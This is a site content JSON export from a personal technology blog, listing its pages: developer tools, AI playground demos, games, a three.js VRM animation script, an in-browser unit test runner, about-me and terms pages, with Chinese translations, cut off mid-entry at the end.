{"meta":{"title":"Decoding Digital Anomalies","subtitle":"Sometimes the feature is the bug in the digital rabbit hole, and vice versa","description":null,"author":"Neo Alienson","url":"https://neo01.com","root":"/"},"pages":[{"title":"","date":"un66fin66","updated":"un66fin66","comments":true,"path":"404.html","permalink":"https://neo01.com/404.html","excerpt":"","text":"Page not found"},{"title":"Games","date":"un55fin55","updated":"un55fin55","comments":true,"path":"games.html","permalink":"https://neo01.com/games.html","excerpt":"","text":"A curated collection of minigames developed with AI assisted. 3D 🎮 Connected 4 3D A three-dimensional twist on the classic Connect Four game. Drop pieces in a 4x4x4 cube and try to get four in a row in any direction. 3D gameplay mechanics Interactive 3D visualization prompt More tools coming soon…"},{"title":"Home","date":"un66fin66","updated":"un22fin22","comments":false,"path":"index.html","permalink":"https://neo01.com/index.html","excerpt":"","text":"Recent posts"},{"title":"AI Playground","date":"un33fin33","updated":"un55fin55","comments":true,"path":"ai.html","permalink":"https://neo01.com/ai.html","excerpt":"","text":"Experimental tools using Chrome’s built-in AI APIs. These tools require Chrome Canary with AI features enabled. 🤖 Text Processing 📝 Text Summarizer Generate summaries of text using Chrome's built-in Summarization API. Choose from different summary types, lengths, and formats. Multiple summary types (Key Points, TL;DR, Teaser, Headline) Adjustable length (Short, Medium, Long) Output formats (Markdown, Plain text) Real-time token usage tracking 💬 Prompt API Playground Interact with Chrome's built-in Language Model (Gemini Nano) through a conversational interface. Experiment with different parameters and see real-time responses. Streaming responses with markdown support Adjustable temperature and top-k parameters Session management and token tracking Conversation history display Note: These tools require Chrome Canary/Beta with experimental AI features enabled. Visit chrome://flags/#optimization-guide-on-device-model to enable AI features."},{"title":"My Badges","date":"un44fin44","updated":"un33fin33","comments":false,"path":"about-me/badges.html","permalink":"https://neo01.com/about-me/badges.html","excerpt":"","text":"Badges Microsoft ISC2 Google Skillshop AWS Alibaba Cloud IBM PMP Other"},{"title":"VRM","date":"un55fin55","updated":"un55fin55","comments":true,"path":"vrm.html","permalink":"https://neo01.com/vrm.html","excerpt":"","text":"Make Dance { \"imports\": { \"three\": \"https://unpkg.com/three@0.158.0/build/three.module.js\" } } import * as THREE from 'https://unpkg.com/three@0.158.0/build/three.module.js'; import { GLTFLoader } from 'https://unpkg.com/three@0.158.0/examples/jsm/loaders/GLTFLoader.js'; import { OrbitControls } from 'https://unpkg.com/three@0.158.0/examples/jsm/controls/OrbitControls.js'; import { VRMLoaderPlugin } from 'https://unpkg.com/@pixiv/three-vrm@1.0.10/lib/three-vrm.module.js'; const container = document.getElementById('vrm-container'); const scene = new THREE.Scene(); const camera = new THREE.PerspectiveCamera(75, container.clientWidth / container.clientHeight, 0.1, 1000); const renderer = new THREE.WebGLRenderer({ antialias: true }); renderer.setSize(container.clientWidth, container.clientHeight); renderer.setClearColor(0xf0f0f0); container.appendChild(renderer.domElement); camera.position.set(0, 1.5, 3); const light = new THREE.DirectionalLight(0xffffff, 1); light.position.set(1, 1, 1); scene.add(light); scene.add(new THREE.AmbientLight(0x404040, 0.5)); const controls = new OrbitControls(camera, renderer.domElement); controls.target.set(0, 1, 0); controls.update(); const loader = new GLTFLoader(); loader.register((parser) => new VRMLoaderPlugin(parser)); let vrm = null; let isDancing = false; loader.load( '/css/vivi.vrm', (gltf) => { vrm = gltf.userData.vrm; scene.add(vrm.scene); // Simple idle animation const clock = new THREE.Clock(); function animate() { requestAnimationFrame(animate); const deltaTime = clock.getDelta(); if (vrm) { // Dance animation if (isDancing) { const time = clock.getElapsedTime(); vrm.scene.rotation.y = Math.sin(time * 2) * 0.3; vrm.scene.position.y = Math.abs(Math.sin(time * 4)) * 0.2; } vrm.update(deltaTime); } controls.update(); renderer.render(scene, camera); } animate(); }, (progress) => console.log('Loading progress:', progress), (error) => console.error('Error loading VRM:', error) ); document.getElementById('dance-btn').addEventListener('click', () => { isDancing = !isDancing; document.getElementById('dance-btn').textContent = isDancing ? 'Stop Dancing' : 'Make Dance'; }); window.addEventListener('resize', () => { camera.aspect = container.clientWidth / container.clientHeight; camera.updateProjectionMatrix(); renderer.setSize(container.clientWidth, container.clientHeight); });"},{"title":"Tools","date":"un33fin33","updated":"un55fin55","comments":true,"path":"tools.html","permalink":"https://neo01.com/tools.html","excerpt":"","text":"A curated collection of useful tools for developers and content creators 📝 Text Processing 📊 Text Statistics Analyze text and get comprehensive statistics including character count, word count, and LLM token estimation. Perfect for content writing and API planning. 8 different text metrics LLM token estimation Reading time calculation 🔤 Case Converter Convert text between different case formats including camelCase, snake_case, kebab-case, and more. Essential for developers working with different naming conventions. 15 different case formats Grid layout for easy comparison 🎨 ASCII Text Drawer Convert text into ASCII art using various fonts. Perfect for creating banners, headers, and decorative text for documentation or terminal applications. Multiple ASCII art fonts Clean, responsive interface 📻 NATO Alphabet Converter Convert text to NATO phonetic alphabet for clear communication. Essential for radio communications, spelling out information, and military/aviation contexts. 6 different output formats Handles letters, numbers, and special characters 😀 Emoji Picker Browse emojis with search and category filtering. Perfect for social media, messaging, and content creation. Category-based browsing Search by emoji name 500+ emojis across all categories 🔧 Encoding & Formatting 🔐 Base64 Encoder/Decoder Encode and decode Base64 strings with optional URL-safe mode. Essential for data encoding, API integration, and secure data transmission. Standard and URL-safe Base64 encoding Bidirectional conversion (encode/decode) Unicode and special character support Error handling for invalid input 🌐 URL Encoder/Decoder Encode and decode URLs and text for safe transmission over the internet. Essential for web development and API work. Manual encode/decode controls Error handling for invalid input 🏷️ HTML Entities Escape/Unescape Escape and unescape HTML entities for safe web content display. Essential for web development, preventing XSS attacks, and handling special characters. Bidirectional conversion (escape/unescape) Handles common and numeric entities 📋 JSON Validator & Formatter Validate, format, and minify JSON with detailed error messages. Complete JSON tool with vertical layout and advanced formatting options. Validation with error details Sort keys alphabetically option Customizable indentation (2 spaces, 4 spaces, tabs) Format and minify operations 🔄 JSON to YAML Converter Convert between JSON and YAML formats with bidirectional conversion. Essential for configuration files and data interchange between different systems. Bidirectional conversion (JSON ↔ YAML) Pretty formatting option Error handling for invalid input 🔒 Security & Analysis 🔒 Hash Text Generate cryptographic hashes for any text using various algorithms. Useful for data integrity verification, password hashing, and security applications. 7 hash algorithms (MD5, SHA1, SHA256, SHA512, SHA3-256, SHA3-512, RIPEMD160) Secure client-side processing 🔑 X.509 Certificate Decoder Decode and analyze X.509 certificates in PEM format. Extract certificate details, validity periods, and security information. PEM certificate parsing Certificate field extraction Security information display 🔍 URL Parser Parse and analyze URL components including protocol, host, path, query parameters, and fragments. Perfect for debugging and URL analysis. Extract all URL components Query parameter table view ⚙️ System Administration 🔧 Chmod Calculator Calculate Unix file permissions in octal and symbolic notation. Essential for system administration and file security. Interactive permission checkboxes Octal and symbolic notation display Bidirectional conversion Common permission examples ⏰ Crontab Generator Generate cron expressions with visual interface and human-readable descriptions. Perfect for scheduling tasks and automation. Visual dropdown interface Human-friendly descriptions Common scheduling patterns 🌐 IPv4 Subnet Calculator Calculate IPv4 subnet information from CIDR notation with comprehensive network details. Essential for network administration and planning. Complete subnet information Network and broadcast addresses Host range and count calculations Binary subnet mask display 🛠️ Utilities 🌡️ Temperature Converter Convert temperatures between Celsius, Fahrenheit, Kelvin, and Rankine scales. Essential for scientific calculations and international communication. 4 temperature scales (°C, °F, K, °R) Interactive scale switching ⏱️ Chronometer Precise stopwatch and timer with lap functionality. Perfect for timing activities, workouts, or any time-sensitive tasks. Millisecond precision timing Start, pause, stop, and reset controls Lap time recording with individual durations Responsive design for mobile use 🌍 World Clock Display multiple timezone clocks simultaneously. Perfect for coordinating across time zones, scheduling international meetings, or tracking global time. Multiple timezone display with updates Add/remove timezones with easy selection Shows date, time, and timezone information 35+ major cities and timezones included 📱 Device Information Display comprehensive information about your device, browser, and screen. Includes advanced user agent parsing and AI capabilities detection. Screen size and orientation details Browser vendor and platform info Editable user agent parsing AI capabilities detection (Chrome's built-in AI) 📊 Mermaid Diagram Editor Create and edit Mermaid diagrams with live preview and interactive controls. Perfect for creating flowcharts, sequence diagrams, and other visual documentation. Diagram rendering with updates Multiple diagram types (flowchart, sequence, gantt, pie, class) Zoom and pan controls for large diagrams Example templates for quick start 🖼️ File Analysis 🖼️ PNG Metadata Checker Extract and analyze metadata from PNG files with drag and drop support. View image properties, textual data, timestamps, and technical information. Drag and drop file upload Complete PNG metadata extraction Image properties and color information Textual data with formatted display 📷 EXIF Extractor Extract and analyze EXIF metadata from JPEG images with drag and drop support. View camera settings, timestamps, and technical photography information. Drag and drop JPEG upload Complete EXIF data extraction Camera settings and exposure info JPEG segment analysis Unit Tests - JavaScript unit tests for the developer tools. More tools coming soon…"},{"title":"Non Protracted Certifications","date":"un44fin44","updated":"un66fin66","comments":false,"path":"about-me/non_proctored_certs.html","permalink":"https://neo01.com/about-me/non_proctored_certs.html","excerpt":"","text":"Non-proctored certifications are digital credentials earned through online courses and assessments without supervised examination. These certifications demonstrate continuous learning and validate specific technical skills across various technology domains. While they may not carry the same weight as proctored professional certifications, they’re valuable for building my portfolios. Google Secure Code Warrior AWS Other"},{"title":"About Me","date":"un44fin44","updated":"un66fin66","comments":false,"path":"about-me/index.html","permalink":"https://neo01.com/about-me/index.html","excerpt":"","text":"I’m a technology professional with expertise spanning AI, cloud architecture and cybersecurity. My journey in the tech industry has led me to pursue continuous learning through professional certifications across major cloud platforms and security frameworks. The certificates displayed below represent hands-on experience with enterprise-grade technologies and demonstrate my commitment to staying current with industry best practices and emerging technologies. All certificates shown on this page are earned through proctored examinations. Proctored exams are supervised assessments conducted under strict security measures, including identity verification, live monitoring, and controlled testing environments to ensure exam integrity. This differs from non-proctored assessments, which are typically online courses or self-paced learning modules without supervised testing. The rigorous nature of proctored certifications provides greater assurance of the candidate’s verified knowledge and skills. Non-proctored course completions are listed on a separate page. Beyond formal certifications, I actively engage with emerging technologies through various learning platforms and vendor training programs. My collection includes digital badges from completion certificates. and more … Certificates Google Microsoft Microsoft and LinkedIn ISC2 Alibaba Cloud AWS Other"},{"title":"More About Me","date":"un44fin44","updated":"un33fin33","comments":false,"path":"about-me/more.html","permalink":"https://neo01.com/about-me/more.html","excerpt":"","text":"My GitHub neo.alienson @neoalienson 📍 Hong Kong 🔗 https://01man.com 📁 43 Repositories ⭐ 22 Stars 📈 34 Commits 👥 14 Followers 🔄 20 Pull Requests ❗ 0 Issues JavaScript 44.4% Swift 11.1% Dart 8.3% Python 8.3% TypeScript 8.3% Other 19.4% Contributions Gemini CLI - Fix invalid docker command and invalid JSON in the mcpServers example. HKOpenAI learnGitBranching - Translations - fix typo in zh_TW simple_animated_icon - Add web support in example simple_animated_icon - Upgrade to non-nullable respond6 - add docker file and readme respond6 - remind user the db config can be ignore respond6 - more instructions for setup gists-backup - hide password from prompt using sync-prompt react-chartjs - fix failed to update points for doughnut chart browsermob-proxy - Blacklist with method matcher OpenCV - Fix typos Robotium - Show error message from logcat when its return value is non-zero. chatty - my openshift doesn’t has OPENSHIFT_INTERNAL_PORT and OPENSHIFT_INTERNAL_IP My StackOverflow My desk 2006 Misc My Docker Hub When did I start using the name Neo Many people link my English name Neo with the film Matrix. In fact, I have been using this English name for over 20 years. Before the dawn of Internet, we communicate around the globe with Bulletin board system (BBS) over telephone lines with modems. My original English name Leo collides with other BBS users and I have to pick another one. I choose Neo and keep using it even it collides with other users from Latin America."},{"title":"Terms and Conditions","date":"un44fin44","updated":"un22fin22","comments":false,"path":"terms-and-conditions/index.html","permalink":"https://neo01.com/terms-and-conditions/index.html","excerpt":"","text":"Content All content provided on this blog is for informational purposes only. The owner of this blog makes no representations as to the accuracy or completeness of any information on this site or found by following any link on this site. The owner will not be liable for any errors or omissions in this information nor for the availability of this information. The owner will not be liable for any losses, injuries, or damages from the display or use of this information. Copyright All content on this website is the property of the blog owner and is protected by copyright laws. Any reproduction, retransmission, republication, or other use of all or part of this content is expressly prohibited, unless prior written permission has been granted by the blog owner. Links to Third-Party Websites This blog may contain links to third-party websites that are not controlled by the blog owner. These links are provided for your convenience, and the blog owner is not responsible for the content or accuracy of any linked websites. Privacy Policy Disclosure We partner with Microsoft Clarity and Microsoft Advertising to capture how you use and interact with our website through behavioral metrics, heatmaps, and session replay to improve and market our products/services. Website usage data is captured using first and third-party cookies and other tracking technologies to determine the popularity of products/services and online activity. Additionally, we use this information for site optimization, fraud/security purposes, and advertising. For more information about how Microsoft collects and uses your data, visit the Microsoft Privacy Statement AI Generated Content Disclosure This blog site utilizes generative AI tools to enhance our creative process, primarily focusing on writing assistance. Our AI systems, including LLaMA 2, LLaMA 3, and DALL-E, aid in improving readability, detecting spelling and grammar errors, and optimizing search engine rankings, but not limited to these functions. While we do not rely on AI-generated images or videos, human editors thoroughly review any AI-produced content to ensure its accuracy, relevance, and overall quality before incorporating it into this blog posts. This hybrid approach allows us to streamline our workflow while maintaining the highest standards of creative expression. Disclaimer of Warranties The information on this website is provided “as is” without warranties of any kind, either expressed or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement. Limitation of Liability In no event shall the blog owner be liable for any direct, indirect, incidental, special, consequential, or punitive damages arising out of or in connection with the use of, or inability to use, this website or any content on this website. Governing Law and Jurisdiction These terms and conditions shall be governed by and construed in accordance with the laws of the applicable jurisdiction. Any disputes arising from these terms and conditions will be subject to the exclusive jurisdiction of the courts of the applicable jurisdiction. Changes to Terms and Conditions These terms and conditions of use are subject to change at any time and without notice. Your continued use of this website constitutes acceptance of any changes to these terms and conditions. Contact Information If you have any questions or concerns regarding these terms and conditions, please contact the blog owner using the contact information provided on this website."},{"title":"Tools Unit Test","date":"un00fin00","updated":"un00fin00","comments":true,"path":"tools/test-runner.html","permalink":"https://neo01.com/tools/test-runner.html","excerpt":"","text":"// Prevent auto-initialization in test environment const originalAddEventListener = document.addEventListener; document.addEventListener = (event, handler) => { if (event === 'DOMContentLoaded' && handler.toString().includes('new ')) { return; // Skip auto-initialization } originalAddEventListener.call(document, event, handler); }; // Initialize framework const framework = new TestFramework(); framework.currentTool = null; // Restore addEventListener document.addEventListener = originalAddEventListener; framework.currentTool = 'json-validator'; framework.currentTool = 'case-converter'; framework.currentTool = 'hash-text'; framework.currentTool = 'url-parser'; framework.currentTool = 'temperature-converter'; framework.currentTool = 'text-statistics'; framework.currentTool = 'sql-prettify'; framework.currentTool = 'crontab-generator'; framework.currentTool = 'ipv4-subnet-calculator'; framework.currentTool = 'base64-converter'; framework.currentTool = 'x509-decoder'; framework.currentTool = 'png-metadata-checker'; framework.currentTool = 'exif-extractor'; framework.currentTool = 'json-yaml-converter'; document.addEventListener('DOMContentLoaded', () => { const output = document.getElementById('output'); const originalLog = console.log; const tools = {}; console.log = (message) => { const text = String(message); const match = text.match(/^([✓✗]) ([^:]+):(.+?)(?::(.*)?)?$/); if (match) { const [, status, tool, testName, error] = match; if (!tools[tool]) { tools[tool] = { passed: 0, failed: 0, tests: [] }; } if (status === '✓') { tools[tool].passed++; tools[tool].tests.push({ name: testName, status: 'passed' }); } else { tools[tool].failed++; tools[tool].tests.push({ name: testName, status: 'failed', error: error?.trim() }); } return; } if (text.includes('Results:')) { output.innerHTML = 'Running tests...\\n\\n'; Object.keys(tools).sort().forEach(tool => { const t = tools[tool]; const total = t.passed + t.failed; if (total > 0) { output.innerHTML += `${tool}: ${t.passed}/${total} passed\\n`; t.tests.forEach(test => { if (test.status === 'passed') { output.innerHTML += ` ✓ ${test.name}\\n`; } else { output.innerHTML += ` ✗ ${test.name}${test.error ? ': ' + test.error.replace(//g, '&gt;') : ''}\\n`; } }); } }); output.innerHTML += '\\n' + text.replace(//g, '&gt;') + '\\n'; } }; framework.run(); console.log = originalLog; });"},{"title":"AI 游乐场","date":"un33fin33","updated":"un55fin55","comments":true,"path":"zh-CN/ai.html","permalink":"https://neo01.com/zh-CN/ai.html","excerpt":"","text":"使用 Chrome 内建 AI API 的实验性工具。这些工具需要启用 AI 功能的 Chrome Canary。 🤖 文字处理 📝 文字摘要器 使用 Chrome 内建的摘要 API 生成文字摘要。可选择不同的摘要类型、长度和格式。 多种摘要类型（重点、TL;DR、预告、标题） 可调整长度（短、中、长） 输出格式（Markdown、纯文字） 实时令牌使用追踪 💬 提示 API 游乐场 通过对话界面与 Chrome 内建语言模型（Gemini Nano）互动。实验不同参数并查看实时响应。 支持 Markdown 的流式响应 可调整温度和 top-k 参数 会话管理和令牌追踪 对话历史显示 注意：这些工具需要启用实验性 AI 功能的 Chrome Canary/Beta。请访问 chrome://flags/#optimization-guide-on-device-model 以启用 AI 功能。","lang":"zh-CN"},{"title":"游戏","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/games.html","permalink":"https://neo01.com/zh-CN/games.html","excerpt":"","text":"精选的 AI 辅助开发小游戏集合。 3D 🎮 Connected 4 3D 经典四子棋游戏的三维版本。在 4x4x4 立方体中放置棋子，尝试在任何方向上连成四个。 3D 游戏机制 交互式 3D 可视化 提示 更多工具即将推出…","lang":"zh-CN"},{"title":"工具","date":"un33fin33","updated":"un55fin55","comments":true,"path":"zh-CN/tools.html","permalink":"https://neo01.com/zh-CN/tools.html","excerpt":"","text":"精选的开发者和内容创作者实用工具集合 📝 文字处理 📊 文字统计 分析文字并获取全面的统计信息，包括字符数、字数和 LLM 令牌估算。非常适合内容写作和 API 规划。 8 种不同的文字指标 LLM 令牌估算 阅读时间计算 🔤 大小写转换器 在不同的大小写格式之间转换文字，包括 camelCase、snake_case、kebab-case 等。对于使用不同命名惯例的开发者来说至关重要。 15 种不同的大小写格式 网格布局便于比较 🎨 ASCII 文字绘制器 使用各种字体将文字转换为 ASCII 艺术。非常适合为文档或终端应用程序创建横幅、标题和装饰文字。 多种 ASCII 艺术字体 简洁、响应式界面 📻 NATO 字母转换器 将文字转换为 NATO 语音字母以进行清晰通信。对于无线电通信、拼写信息以及军事/航空环境至关重要。 6 种不同的输出格式 处理字母、数字和特殊字符 😀 表情符号选择器 通过搜索和类别筛选浏览表情符号。非常适合社交媒体、消息传递和内容创作。 基于类别的浏览 按表情符号名称搜索 所有类别中超过 500 个表情符号 🔧 编码与格式化 🔐 Base64 编码器/解码器 使用可选的 URL 安全模式编码和解码 Base64 字符串。对于数据编码、API 集成和安全数据传输至关重要。 标准和 URL 安全的 Base64 编码 双向转换（编码/解码） Unicode 和特殊字符支持 无效输入的错误处理 🌐 URL 编码器/解码器 编码和解码 URL 和文字以便在互联网上安全传输。对于网页开发和 API 工作至关重要。 手动编码/解码控制 无效输入的错误处理 🏷️ HTML 实体转义/反转义 转义和反转义 HTML 实体以安全显示网页内容。对于网页开发、防止 XSS 攻击和处理特殊字符至关重要。 双向转换（转义/反转义） 处理常见和数字实体 📋 JSON 验证器与格式化器 使用详细的错误消息验证、格式化和压缩 JSON。具有垂直布局和高级格式化选项的完整 JSON 工具。 带有错误详情的验证 按字母顺序排序键选项 可自定义的缩进（2 个空格、4 个空格、制表符） 格式化和压缩操作 🔄 JSON 到 YAML 转换器 使用双向转换在 JSON 和 YAML 格式之间转换。对于配置文件和不同系统之间的数据交换至关重要。 双向转换（JSON ↔ YAML） 美化格式化选项 无效输入的错误处理 🔒 安全与分析 🔒 哈希文字 使用各种算法为任何文字生成加密哈希。对于数据完整性验证、密码哈希和安全应用程序很有用。 7 种哈希算法（MD5、SHA1、SHA256、SHA512、SHA3-256、SHA3-512、RIPEMD160） 安全的客户端处理 🔑 X.509 证书解码器 解码和分析 PEM 格式的 X.509 证书。提取证书详细信息、有效期和安全信息。 PEM 证书解析 证书字段提取 安全信息显示 🔍 URL 解析器 解析和分析 URL 组件，包括协议、主机、路径、查询参数和片段。非常适合调试和 URL 分析。 提取所有 URL 组件 查询参数表格视图 ⚙️ 系统管理 🔧 Chmod 计算器 以八进制和符号表示法计算 Unix 文件权限。对于系统管理和文件安全至关重要。 交互式权限复选框 八进制和符号表示法显示 双向转换 常见权限示例 ⏰ Crontab 生成器 使用可视化界面和人类可读的描述生成 cron 表达式。非常适合调度任务和自动化。 可视化下拉界面 人性化描述 常见调度模式 🌐 IPv4 子网计算器 从 CIDR 表示法计算 IPv4 子网信息，包含全面的网络详细信息。对于网络管理和规划至关重要。 完整的子网信息 网络和广播地址 主机范围和数量计算 二进制子网掩码显示 🛠️ 实用工具 🌡️ 温度转换器 在摄氏、华氏、开尔文和兰金温标之间转换温度。对于科学计算和国际交流至关重要。 4 种温标（°C、°F、K、°R） 交互式温标切换 ⏱️ 计时器 具有计圈功能的精确秒表和计时器。非常适合计时活动、锻炼或任何时间敏感的任务。 毫秒精度计时 开始、暂停、停止和重置控制 计圈时间记录与个别持续时间 适用于移动设备的响应式设计 🌍 世界时钟 同时显示多个时区时钟。非常适合跨时区协调、安排国际会议或追踪全球时间。 多时区显示与更新 轻松选择添加/移除时区 显示日期、时间和时区信息 包含 35 个以上主要城市和时区 📱 设备信息 显示有关您的设备、浏览器和屏幕的全面信息。包括高级用户代理解析和 AI 功能检测。 屏幕大小和方向详细信息 浏览器供应商和平台信息 可编辑的用户代理解析 AI 功能检测（Chrome 的内置 AI） 📊 Mermaid 图表编辑器 使用实时预览和交互控制创建和编辑 Mermaid 图表。非常适合创建流程图、序列图和其他可视化文档。 图表渲染与更新 多种图表类型（流程图、序列图、甘特图、饼图、类图） 大型图表的缩放和平移控制 快速入门的示例模板 🖼️ 文件分析 🖼️ PNG 元数据检查器 使用拖放支持从 PNG 文件中提取和分析元数据。查看图像属性、文本数据、时间戳和技术信息。 拖放文件上传 完整的 PNG 元数据提取 图像属性和颜色信息 格式化显示的文本数据 📷 EXIF 提取器 使用拖放支持从 JPEG 图像中提取和分析 EXIF 元数据。查看相机设置、时间戳和技术摄影信息。 拖放 JPEG 上传 完整的 EXIF 数据提取 相机设置和曝光信息 JPEG 段分析 单元测试 - 开发者工具的 JavaScript 单元测试。 更多工具即将推出…","lang":"zh-CN"},{"title":"AI 遊樂場","date":"un33fin33","updated":"un55fin55","comments":true,"path":"zh-TW/ai.html","permalink":"https://neo01.com/zh-TW/ai.html","excerpt":"","text":"使用 Chrome 內建 AI API 的實驗性工具。這些工具需要啟用 AI 功能的 Chrome Canary。 🤖 文字處理 📝 文字摘要器 使用 Chrome 內建的摘要 API 產生文字摘要。可選擇不同的摘要類型、長度和格式。 多種摘要類型（重點、TL;DR、預告、標題） 可調整長度（短、中、長） 輸出格式（Markdown、純文字） 即時代幣使用追蹤 💬 提示 API 遊樂場 透過對話介面與 Chrome 內建語言模型（Gemini Nano）互動。實驗不同參數並查看即時回應。 支援 Markdown 的串流回應 可調整溫度和 top-k 參數 工作階段管理和代幣追蹤 對話歷史顯示 注意：這些工具需要啟用實驗性 AI 功能的 Chrome Canary/Beta。請造訪 chrome://flags/#optimization-guide-on-device-model 以啟用 AI 功能。","lang":"zh-TW"},{"title":"工具","date":"un33fin33","updated":"un55fin55","comments":true,"path":"zh-TW/tools.html","permalink":"https://neo01.com/zh-TW/tools.html","excerpt":"","text":"精選的開發者和內容創作者實用工具集合 📝 文字處理 📊 文字統計 分析文字並獲取全面的統計資訊，包括字元數、字數和 LLM 代幣估算。非常適合內容寫作和 API 規劃。 8 種不同的文字指標 LLM 代幣估算 閱讀時間計算 🔤 大小寫轉換器 在不同的大小寫格式之間轉換文字，包括 camelCase、snake_case、kebab-case 等。對於使用不同命名慣例的開發者來說至關重要。 15 種不同的大小寫格式 網格佈局便於比較 🎨 ASCII 文字繪製器 使用各種字體將文字轉換為 ASCII 藝術。非常適合為文件或終端應用程式建立橫幅、標題和裝飾文字。 多種 ASCII 藝術字體 簡潔、響應式介面 📻 NATO 字母轉換器 將文字轉換為 NATO 語音字母以進行清晰通訊。對於無線電通訊、拼寫資訊以及軍事/航空環境至關重要。 6 種不同的輸出格式 處理字母、數字和特殊字元 😀 表情符號選擇器 透過搜尋和類別篩選瀏覽表情符號。非常適合社群媒體、訊息傳遞和內容創作。 基於類別的瀏覽 按表情符號名稱搜尋 所有類別中超過 500 個表情符號 🔧 編碼與格式化 🔐 Base64 編碼器/解碼器 使用可選的 URL 安全模式編碼和解碼 Base64 字串。對於資料編碼、API 整合和安全資料傳輸至關重要。 標準和 URL 安全的 Base64 編碼 雙向轉換（編碼/解碼） Unicode 和特殊字元支援 無效輸入的錯誤處理 🌐 URL 編碼器/解碼器 編碼和解碼 URL 和文字以便在網際網路上安全傳輸。對於網頁開發和 API 工作至關重要。 手動編碼/解碼控制 無效輸入的錯誤處理 🏷️ HTML 實體轉義/反轉義 轉義和反轉義 HTML 實體以安全顯示網頁內容。對於網頁開發、防止 XSS 攻擊和處理特殊字元至關重要。 雙向轉換（轉義/反轉義） 處理常見和數字實體 📋 JSON 驗證器與格式化器 使用詳細的錯誤訊息驗證、格式化和壓縮 JSON。具有垂直佈局和進階格式化選項的完整 JSON 工具。 帶有錯誤詳情的驗證 按字母順序排序鍵選項 可自訂的縮排（2 個空格、4 個空格、製表符） 格式化和壓縮操作 🔄 JSON 到 YAML 轉換器 使用雙向轉換在 JSON 和 YAML 格式之間轉換。對於設定檔和不同系統之間的資料交換至關重要。 雙向轉換（JSON ↔ YAML） 美化格式化選項 無效輸入的錯誤處理 🔒 安全與分析 🔒 雜湊文字 使用各種演算法為任何文字產生加密雜湊。對於資料完整性驗證、密碼雜湊和安全應用程式很有用。 7 種雜湊演算法（MD5、SHA1、SHA256、SHA512、SHA3-256、SHA3-512、RIPEMD160） 安全的客戶端處理 🔑 X.509 憑證解碼器 解碼和分析 PEM 格式的 X.509 憑證。提取憑證詳細資訊、有效期和安全資訊。 PEM 憑證解析 憑證欄位提取 安全資訊顯示 🔍 URL 解析器 解析和分析 URL 元件，包括協定、主機、路徑、查詢參數和片段。非常適合除錯和 URL 分析。 提取所有 URL 元件 查詢參數表格檢視 ⚙️ 系統管理 🔧 Chmod 計算器 以八進位和符號表示法計算 Unix 檔案權限。對於系統管理和檔案安全至關重要。 互動式權限核取方塊 八進位和符號表示法顯示 雙向轉換 常見權限範例 ⏰ Crontab 產生器 使用視覺化介面和人類可讀的描述產生 cron 表達式。非常適合排程任務和自動化。 視覺化下拉式介面 人性化描述 常見排程模式 🌐 IPv4 子網路計算器 從 CIDR 表示法計算 IPv4 子網路資訊，包含全面的網路詳細資訊。對於網路管理和規劃至關重要。 完整的子網路資訊 網路和廣播位址 主機範圍和數量計算 二進位子網路遮罩顯示 🛠️ 實用工具 🌡️ 溫度轉換器 在攝氏、華氏、克耳文和蘭金溫標之間轉換溫度。對於科學計算和國際交流至關重要。 4 種溫標（°C、°F、K、°R） 互動式溫標切換 ⏱️ 計時器 具有計圈功能的精確碼錶和計時器。非常適合計時活動、鍛鍊或任何時間敏感的任務。 毫秒精度計時 開始、暫停、停止和重置控制 計圈時間記錄與個別持續時間 適用於行動裝置的響應式設計 🌍 世界時鐘 同時顯示多個時區時鐘。非常適合跨時區協調、安排國際會議或追蹤全球時間。 多時區顯示與更新 輕鬆選擇新增/移除時區 顯示日期、時間和時區資訊 包含 35 個以上主要城市和時區 📱 裝置資訊 顯示有關您的裝置、瀏覽器和螢幕的全面資訊。包括進階使用者代理解析和 AI 功能偵測。 螢幕大小和方向詳細資訊 瀏覽器供應商和平台資訊 可編輯的使用者代理解析 AI 功能偵測（Chrome 的內建 AI） 📊 Mermaid 圖表編輯器 使用即時預覽和互動控制建立和編輯 Mermaid 圖表。非常適合建立流程圖、序列圖和其他視覺化文件。 圖表渲染與更新 多種圖表類型（流程圖、序列圖、甘特圖、圓餅圖、類別圖） 大型圖表的縮放和平移控制 快速入門的範例範本 🖼️ 檔案分析 🖼️ PNG 中繼資料檢查器 使用拖放支援從 PNG 檔案中提取和分析中繼資料。檢視影像屬性、文字資料、時間戳記和技術資訊。 拖放檔案上傳 完整的 PNG 中繼資料提取 影像屬性和顏色資訊 格式化顯示的文字資料 📷 EXIF 提取器 使用拖放支援從 JPEG 影像中提取和分析 EXIF 中繼資料。檢視相機設定、時間戳記和技術攝影資訊。 拖放 JPEG 上傳 完整的 EXIF 資料提取 相機設定和曝光資訊 JPEG 區段分析 單元測試 - 開發者工具的 JavaScript 單元測試。 更多工具即將推出…","lang":"zh-TW"},{"title":"Home","date":"un55fin55","updated":"un55fin55","comments":false,"path":"zh-TW/index.html","permalink":"https://neo01.com/zh-TW/index.html","excerpt":"","text":"最近的帖子","lang":"zh-TW"},{"title":"遊戲","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/games.html","permalink":"https://neo01.com/zh-TW/games.html","excerpt":"","text":"精選的 AI 輔助開發小遊戲集合。 3D 🎮 Connected 4 3D 經典四子棋遊戲的三維版本。在 4x4x4 立方體中放置棋子，嘗試在任何方向上連成四個。 3D 遊戲機制 互動式 3D 視覺化 提示 更多工具即將推出…","lang":"zh-TW"},{"title":"Browser Prompt API Playground","date":"un66fin66","updated":"un66fin66","comments":true,"path":"ai/prompt/index.html","permalink":"https://neo01.com/ai/prompt/index.html","excerpt":"","text":"This is a demo of Chrome's built-in Prompt API powered by Gemini Nano. Prompt What is the capital of France? Submit prompt Reset session Top-k Temperature Session stats Temperature Top-k Tokens so far Tokens left Total tokens &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Conversation Raw response"},{"title":"Connected 4 in 3D","date":"un55fin55","updated":"un55fin55","comments":true,"path":"games/connected_4_3d/index.html","permalink":"https://neo01.com/games/connected_4_3d/index.html","excerpt":"","text":"Player 1's Turn ← ↑ ↓ → DROP Reset Game Instructions Use Arrow Keys (Left, Right, Up, Down) to move the claw. Press Spacebar to drop a piece. Connect 4 of your pieces in a row (horizontally, vertically, or diagonally) to win! Click \"Reset\" to start a new game. Camera Controls Rotate View: Click and drag with the left mouse button. Zoom In/Out: Scroll the mouse wheel. Pan View: Click and drag with the right mouse button (or Ctrl + left mouse button)."},{"title":"Connected 4 in 3D 